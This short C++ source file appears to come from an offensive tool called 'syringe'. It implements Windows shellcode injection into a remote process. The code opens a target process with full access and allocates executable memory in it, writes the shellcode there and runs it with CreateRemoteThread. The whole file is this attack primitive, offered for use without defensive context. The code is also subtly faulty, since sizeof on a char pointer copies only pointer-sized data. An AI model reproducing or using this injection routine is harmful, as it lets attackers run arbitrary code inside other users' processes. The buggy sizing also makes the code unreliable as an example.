#include "../../includes/shellcode/remote.hpp"


/*
    *    syringe/shellcode/remote.cpp
    *    Date: 12/6/21
    *    Author: 0x1CA3
*/


void RemoteProcessShellcodeExecution::Execute(int pid, char *s) {
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    PVOID buf = VirtualAllocEx(h, NULL, sizeof(s), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h, buf, s, sizeof(s), NULL);
    HANDLE thread = CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
    CloseHandle(h);
}